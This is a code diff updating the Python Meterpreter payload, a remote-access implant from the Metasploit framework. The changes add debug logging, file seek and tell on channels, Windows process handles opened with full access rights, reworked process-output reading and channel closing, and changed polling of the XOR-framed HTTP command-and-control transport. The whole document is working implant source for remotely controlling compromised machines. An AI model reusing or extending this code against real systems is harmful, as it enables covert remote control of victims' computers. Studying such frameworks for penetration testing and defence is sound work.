@@ -59,6 +59,7 @@ random.seed()
 
 # these values will be patched, DO NOT CHANGE THEM
 DEBUGGING = False
+DEBUGGING_LOG_FILE_PATH = None
 TRY_TO_FORK = True
 HTTP_CONNECTION_URL = None
 HTTP_PROXY = None
@@ -347,21 +348,32 @@ COMMAND_IDS = (
     (1115, 'stdapi_audio_mic_start'),
     (1116, 'stdapi_audio_mic_stop'),
     (1117, 'stdapi_audio_mic_list'),
+    (1118, 'stdapi_sys_process_set_term_size'),
+
 )
 # ---------------------------------------------------------------
 
-class SYSTEM_INFO(ctypes.Structure):
-    _fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
-        ("wReserved", ctypes.c_uint16),
-        ("dwPageSize", ctypes.c_uint32),
-        ("lpMinimumApplicationAddress", ctypes.c_void_p),
-        ("lpMaximumApplicationAddress", ctypes.c_void_p),
-        ("dwActiveProcessorMask", ctypes.c_uint32),
-        ("dwNumberOfProcessors", ctypes.c_uint32),
-        ("dwProcessorType", ctypes.c_uint32),
-        ("dwAllocationGranularity", ctypes.c_uint32),
-        ("wProcessorLevel", ctypes.c_uint16),
-        ("wProcessorRevision", ctypes.c_uint16)]
+if DEBUGGING:
+    import logging
+    logging.basicConfig(level=logging.DEBUG)
+    if DEBUGGING_LOG_FILE_PATH:
+        file_handler = logging.FileHandler(DEBUGGING_LOG_FILE_PATH)
+        file_handler.setLevel(logging.DEBUG)
+        logging.getLogger().addHandler(file_handler)
+
+if has_windll:
+    class SYSTEM_INFO(ctypes.Structure):
+        _fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
+            ("wReserved", ctypes.c_uint16),
+            ("dwPageSize", ctypes.c_uint32),
+            ("lpMinimumApplicationAddress", ctypes.c_void_p),
+            ("lpMaximumApplicationAddress", ctypes.c_void_p),
+            ("dwActiveProcessorMask", ctypes.c_uint32),
+            ("dwNumberOfProcessors", ctypes.c_uint32),
+            ("dwProcessorType", ctypes.c_uint32),
+            ("dwAllocationGranularity", ctypes.c_uint32),
+            ("wProcessorLevel", ctypes.c_uint16),
+            ("wProcessorRevision", ctypes.c_uint16)]
 
 def rand_bytes(n):
     return os.urandom(n)
@@ -397,7 +409,7 @@ def cmd_string_to_id(this_string):
     for that_id, that_string in COMMAND_IDS:
         if this_string == that_string:
             return that_id
-    debug_print('[*] failed to lookup string for command string: ' + this_string)
+    debug_print('[*] failed to lookup id for command string: ' + this_string)
     return None
 
 @export
@@ -425,14 +437,14 @@ def crc16(data):
 @export
 def debug_print(msg):
     if DEBUGGING:
-        print(msg)
+        logging.debug(msg)
 
 @export
 def debug_traceback(msg=None):
     if DEBUGGING:
         if msg:
-            print(msg)
-        traceback.print_exc(file=sys.stderr)
+            debug_print(msg)
+        debug_print(traceback.format_exc())
 
 @export
 def error_result(exception=None):
@@ -481,7 +493,7 @@ def get_system_arch():
         ctypes.windll.kernel32.GetNativeSystemInfo(ctypes.byref(sysinfo))
         values = {0:'x86', 5:'armle', 6:'IA64', 9:'x64'}
         arch = values.get(sysinfo.wProcessorArchitecture, uname_info[4])
-    if arch == 'x86_64':
+    if arch == 'x86_64' or arch.lower() == 'amd64':
         arch = 'x64'
     return arch
 
@@ -594,6 +606,16 @@ class MeterpreterChannel(object):
         response += tlv_pack(TLV_TYPE_LENGTH, self.write(channel_data))
         return ERROR_SUCCESS, response
 
+    def core_seek(self, request, response):
+        offset = packet_get_tlv(request, TLV_TYPE_SEEK_OFFSET)['value']
+        whence = packet_get_tlv(request, TLV_TYPE_SEEK_WHENCE)['value']
+        self.seek(offset, whence)
+        return ERROR_SUCCESS, response
+
+    def core_tell(self, request, response):
+        response += tlv_pack(TLV_TYPE_SEEK_POS, self.tell())
+        return ERROR_SUCCESS, response
+
     def close(self):
         raise NotImplementedError()
 
@@ -610,6 +632,12 @@ class MeterpreterChannel(object):
         raise NotImplementedError()
 
     def write(self, data):
+        raise NotImplementedError()
+
+    def seek(self, offset, whence=os.SEEK_SET):
+        raise NotImplementedError()
+
+    def tell(self):
         raise NotImplementedError()
 
 #@export
@@ -630,6 +658,12 @@ class MeterpreterFile(MeterpreterChannel):
     def write(self, data):
         self.file_obj.write(data)
         return len(data)
+
+    def seek(self, offset, whence=os.SEEK_SET):
+        self.file_obj.seek(offset, whence)
+
+    def tell(self):
+        return self.file_obj.tell()
 export(MeterpreterFile)
 
 #@export
@@ -639,22 +673,30 @@ class MeterpreterProcess(MeterpreterChannel):
         super(MeterpreterProcess, self).__init__()
 
     def close(self):
-        self.proc_h.kill()
-        if hasattr(self.proc_h.stdin, 'close'):
-            self.proc_h.stdin.close()
-        if hasattr(self.proc_h.stdout, 'close'):
-            self.proc_h.stdout.close()
-        if hasattr(self.proc_h.stderr, 'close'):
-            self.proc_h.stderr.close()
+        if self.proc_h.poll() is None:
+            self.proc_h.kill()
+        if self.proc_h.ptyfd is not None:
+            os.close(self.proc_h.ptyfd)
+            self.proc_h.ptyfd = None
+        for stream in (self.proc_h.stdin, self.proc_h.stdout, self.proc_h.stderr):
+            if not hasattr(stream, 'close'):
+                continue
+            try:
+                stream.close()
+            except (IOError, OSError):
+                pass
 
     def is_alive(self):
-        return self.proc_h.poll() is None
+        return self.proc_h.is_alive()
 
     def read(self, length):
-        data = ''
+        data = bytes()
+        stderr_reader = self.proc_h.stderr_reader
         stdout_reader = self.proc_h.stdout_reader
-        if stdout_reader.is_read_ready():
-            data = stdout_reader.read(length)
+        if stderr_reader.is_read_ready() and length > 0:
+            data += stderr_reader.read(length)
+        if stdout_reader.is_read_ready() and (length - len(data)) > 0:
+            data += stdout_reader.read(length - len(data))
         return data
 
     def write(self, data):
@@ -739,18 +781,33 @@ class MeterpreterSocketUDPClient(MeterpreterSocket):
 export(MeterpreterSocketUDPClient)
 
 class STDProcessBuffer(threading.Thread):
-    def __init__(self, std, is_alive):
-        threading.Thread.__init__(self)
+    def __init__(self, std, is_alive, name=None):
+        threading.Thread.__init__(self, name=name or self.__class__.__name__)
         self.std = std
         self.is_alive = is_alive
         self.data = bytes()
         self.data_lock = threading.RLock()
+        self._is_reading = True
+
+    def _read1(self):
+        try:
+            return self.std.read(1)
+        except (IOError, OSError):
+            return bytes()
 
     def run(self):
-        for byte in iter(lambda: self.std.read(1), bytes()):
-            self.data_lock.acquire()
-            self.data += byte
-            self.data_lock.release()
+        try:
+            byte = self._read1()
+            while len(byte) > 0:
+                self.data_lock.acquire()
+                self.data += byte
+                self.data_lock.release()
+                byte = self._read1()
+        finally:
+            self._is_reading = False
+
+    def is_reading(self):
+        return self._is_reading or self.is_read_ready()
 
     def is_read_ready(self):
         return len(self.data) != 0
@@ -778,14 +835,19 @@ class STDProcess(subprocess.Popen):
         debug_print('[*] starting process: ' + repr(args[0]))
         subprocess.Popen.__init__(self, *args, **kwargs)
         self.echo_protection = False
+        self.ptyfd = None
 
     def is_alive(self):
-        return self.poll() is None
+        is_proc_alive = self.poll() is None
+        is_stderr_reading = self.stderr_reader.is_reading()
+        is_stdout_reading = self.stdout_reader.is_reading()
+
+        return is_proc_alive or is_stderr_reading or is_stdout_reading
 
     def start(self):
-        self.stdout_reader = STDProcessBuffer(self.stdout, self.is_alive)
+        self.stdout_reader = STDProcessBuffer(self.stdout, self.is_alive, name='STDProcessBuffer.stdout')
         self.stdout_reader.start()
-        self.stderr_reader = STDProcessBuffer(self.stderr, self.is_alive)
+        self.stderr_reader = STDProcessBuffer(self.stderr, self.is_alive, name='STDProcessBuffer.stderr')
         self.stderr_reader.start()
 
     def write(self, channel_data):
@@ -988,15 +1050,6 @@ class HttpTransport(Transport):
         self._first_packet = None
         self._empty_cnt = 0
 
-    def _activate(self):
-        return True
-        self._first_packet = None
-        packet = self._get_packet()
-        if packet is None:
-            return False
-        self._first_packet = packet
-        return True
-
     def _get_packet(self):
         if self._first_packet:
             packet = self._first_packet
@@ -1004,31 +1057,31 @@ class HttpTransport(Transport):
             return packet
         packet = None
         xor_key = None
+        url_h = None
         request = urllib.Request(self.url, None, self._http_request_headers)
         urlopen_kwargs = {}
         if sys.version_info > (2, 6):
             urlopen_kwargs['timeout'] = self.communication_timeout
         try:
             url_h = urllib.urlopen(request, **urlopen_kwargs)
-            packet = url_h.read()
-            for _ in range(1):
-                if packet == '':
-                    break
+            if url_h.code == 200:
+                packet = url_h.read()
                 if len(packet) < PACKET_HEADER_SIZE:
                     packet = None  # looks corrupt
-                    break
-                xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
-                header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
-                pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0] - 8
-                if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
-                    packet = None  # looks corrupt
+                else:
+                    xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
+                    header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
+                    pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF + PACKET_LENGTH_SIZE])[0] - 8
+                    if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
+                        packet = None  # looks corrupt
         except:
-            debug_traceback('Failure to receive packet from ' + self.url)
+            debug_traceback('[-] failure to receive packet from ' + self.url)
 
         if not packet:
-            delay = 10 * self._empty_cnt
-            if self._empty_cnt >= 0:
-                delay *= 10
+            if url_h and url_h.code == 200:
+                # server has nothing for us but this is fine so update the communication time and wait
+                self.communication_last = time.time()
+            delay = 100 * self._empty_cnt
             self._empty_cnt += 1
             time.sleep(float(min(10000, delay)) / 1000)
             return packet
@@ -1206,12 +1259,55 @@ class PythonMeterpreter(object):
         self.next_channel_id += 1
         return idx
 
+    def close_channel(self, channel_id):
+        if channel_id not in self.channels:
+            return False
+        channel = self.channels[channel_id]
+        try:
+            channel.close()
+        except Exception:
+            debug_traceback('[-] failed to close channel id: ' + str(channel_id))
+            return False
+        del self.channels[channel_id]
+        if channel_id in self.interact_channels:
+            self.interact_channels.remove(channel_id)
+        debug_print('[*] closed and removed channel id: ' + str(channel_id))
+        return True
+
     def add_process(self, process):
-        idx = self.next_process_id
-        self.processes[idx] = process
-        debug_print('[*] added process id: ' + str(idx))
-        self.next_process_id += 1
-        return idx
+        if has_windll:
+            PROCESS_ALL_ACCESS = 0x1fffff
+            OpenProcess = ctypes.windll.kernel32.OpenProcess
+            OpenProcess.argtypes = [ctypes.c_ulong, ctypes.c_long, ctypes.c_ulong]
+            OpenProcess.restype = ctypes.c_void_p
+            handle = OpenProcess(PROCESS_ALL_ACCESS, False, process.pid)
+        else:
+            handle = self.next_process_id
+            self.next_process_id += 1
+        self.processes[handle] = process
+        debug_print('[*] added process id: ' + str(process.pid) + ', handle: ' + str(handle))
+        return handle
+
+    def close_process(self, proc_h_id):
+        if proc_h_id not in self.processes:
+            return False
+        proc_h = self.processes.pop(proc_h_id)
+        if proc_h:
+            # proc_h is only set when we started the process via execute and not when we attached to it
+            for channel_id, channel in self.channels.items():
+                if not isinstance(channel, MeterpreterProcess):
+                    continue
+                if not channel.proc_h is proc_h:
+                    continue
+                self.close_channel(channel_id)
+                break
+        if has_windll:
+            CloseHandle = ctypes.windll.kernel32.CloseHandle
+            CloseHandle.argtypes = [ctypes.c_void_p]
+            CloseHandle.restype = ctypes.c_long
+            CloseHandle(proc_h_id)
+        debug_print('[*] closed and removed process handle: ' + str(proc_h_id))
+        return True
 
     def get_packet(self):
         pkt = self.transport.get_packet()
@@ -1281,16 +1377,17 @@ class PythonMeterpreter(object):
                 channel = self.channels[channel_id]
                 data = bytes()
                 write_request_parts = []
+                close_channel = False
                 if isinstance(channel, MeterpreterProcess):
-                    if not channel_id in self.interact_channels:
-                        continue
-                    proc_h = channel.proc_h
-                    if proc_h.stderr_reader.is_read_ready():
-                        data = proc_h.stderr_reader.read()
-                    elif proc_h.stdout_reader.is_read_ready():
-                        data = proc_h.stdout_reader.read()
-                    elif not channel.is_alive():
-                        self.handle_dead_resource_channel(channel_id)
+                    if channel_id in self.interact_channels:
+                        proc_h = channel.proc_h
+                        if proc_h.stderr_reader.is_read_ready():
+                            data += proc_h.stderr_reader.read()
+                        if proc_h.stdout_reader.is_read_ready():
+                            data += proc_h.stdout_reader.read()
+                    # Defer closing the channel until the data has been sent
+                    if not channel.is_alive():
+                        close_channel = True
                 elif isinstance(channel, MeterpreterSocketTCPClient):
                     while select.select([channel.fileno()], [], [], 0)[0]:
                         try:
@@ -1309,9 +1406,9 @@ class PythonMeterpreter(object):
                         self.send_packet(tlv_pack_request('stdapi_net_tcp_channel_open', [
                             {'type': TLV_TYPE_CHANNEL_ID, 'value': client_channel_id},
                             {'type': TLV_TYPE_CHANNEL_PARENTID, 'value': channel_id},
-                            {'type': TLV_TYPE_LOCAL_HOST, 'value': inet_pton(channel.sock.family, server_addr[0])},
+                            {'type': TLV_TYPE_LOCAL_HOST, 'value': server_addr[0]},
                             {'type': TLV_TYPE_LOCAL_PORT, 'value': server_addr[1]},
-                            {'type': TLV_TYPE_PEER_HOST, 'value': inet_pton(client_sock.family, client_addr[0])},
+                            {'type': TLV_TYPE_PEER_HOST, 'value': client_addr[0]},
                             {'type': TLV_TYPE_PEER_PORT, 'value': client_addr[1]},
                         ]))
                 elif isinstance(channel, MeterpreterSocketUDPClient):
@@ -1333,10 +1430,15 @@ class PythonMeterpreter(object):
                     ])
                     self.send_packet(tlv_pack_request('core_channel_write', write_request_parts))
 
+                if close_channel:
+                    channel.close()
+                    self.handle_dead_resource_channel(channel_id)
+
     def handle_dead_resource_channel(self, channel_id):
-        del self.channels[channel_id]
         if channel_id in self.interact_channels:
             self.interact_channels.remove(channel_id)
+        if channel_id in self.channels:
+            del self.channels[channel_id]
         self.send_packet(tlv_pack_request('core_channel_close', [
             {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
         ]))
@@ -1352,6 +1454,8 @@ class PythonMeterpreter(object):
         id_end = packet_get_tlv(request, TLV_TYPE_LENGTH)['value'] + id_start
         for func_name in self.extension_functions.keys():
             command_id = cmd_string_to_id(func_name)
+            if command_id is None:
+                continue
             if id_start < command_id and command_id < id_end:
                 response += tlv_pack(TLV_TYPE_UINT, command_id)
         return ERROR_SUCCESS, response
@@ -1540,16 +1644,9 @@ class PythonMeterpreter(object):
 
     def _core_channel_close(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
-        if channel_id not in self.channels:
+        if not self.close_channel(channel_id):
             return ERROR_FAILURE, response
-        channel = self.channels[channel_id]
-        status, response = channel.core_close(request, response)
-        if status == ERROR_SUCCESS:
-            del self.channels[channel_id]
-            if channel_id in self.interact_channels:
-                self.interact_channels.remove(channel_id)
-            debug_print('[*] closed and removed channel id: ' + str(channel_id))
-        return status, response
+        return ERROR_SUCCESS, response
 
     def _core_channel_eof(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
@@ -1557,8 +1654,7 @@ class PythonMeterpreter(object):
             return ERROR_FAILURE, response
         channel = self.channels[channel_id]
         status, response = channel.core_eof(request, response)
-        return ERROR_SUCCESS, response
-
+        return status, response
 
     def _core_channel_interact(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
@@ -1581,8 +1677,6 @@ class PythonMeterpreter(object):
             return ERROR_FAILURE, response
         channel = self.channels[channel_id]
         status, response = channel.core_read(request, response)
-        if not channel.is_alive():
-            self.handle_dead_resource_channel(channel_id)
         return status, response
 
     def _core_channel_write(self, request, response):
@@ -1593,10 +1687,21 @@ class PythonMeterpreter(object):
         status = ERROR_FAILURE
         if channel.is_alive():
             status, response = channel.core_write(request, response)
-        # evaluate channel.is_alive() twice because it could have changed
-        if not channel.is_alive():
-            self.handle_dead_resource_channel(channel_id)
         return status, response
+
+    def _core_channel_seek(self, request, response):
+        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
+        if channel_id not in self.channels:
+            return ERROR_FAILURE, response
+        channel = self.channels[channel_id]
+        return channel.core_seek(request, response)
+
+    def _core_channel_tell(self, request, response):
+        channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
+        if channel_id not in self.channels:
+            return ERROR_FAILURE, response
+        channel = self.channels[channel_id]
+        return channel.core_tell(request, response)
 
     def create_response(self, request):
         response = struct.pack('>I', PACKET_TYPE_RESPONSE)
@@ -1611,7 +1716,7 @@ class PythonMeterpreter(object):
                 debug_print('[*] running method ' + handler_name)
                 result = handler(request, response)
                 if result is None:
-                    debug_print("[-] Not a good result!")
+                    debug_print("[-] handler result is none")
                     return
                 result, response = result
             except Exception:
@@ -1621,15 +1726,18 @@ class PythonMeterpreter(object):
                 if result != ERROR_SUCCESS:
                     debug_print('[-] method ' + handler_name + ' resulted in error: #' + str(result))
         else:
-            debug_print('[-] method ' + handler_name + ' was requested but does not exist')
+            if handler_name is None:
+                debug_print('[-] command id ' + str(commd_id_tlv['value']) + ' was requested but does not exist')
+            else:
+                debug_print('[-] method ' + handler_name + ' was requested but does not exist')
             result = error_result(NotImplementedError)
 
         reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
         if not reqid_tlv:
-            debug_print("[-] No request ID found")
+            debug_print("[-] no request ID found")
             return
         response += tlv_pack(reqid_tlv)
-        debug_print("[*] Sending respond packet")
+        debug_print("[*] sending response packet")
         return response + tlv_pack(TLV_TYPE_RESULT, result)
 
 # PATCH-SETUP-ENCRYPTION #
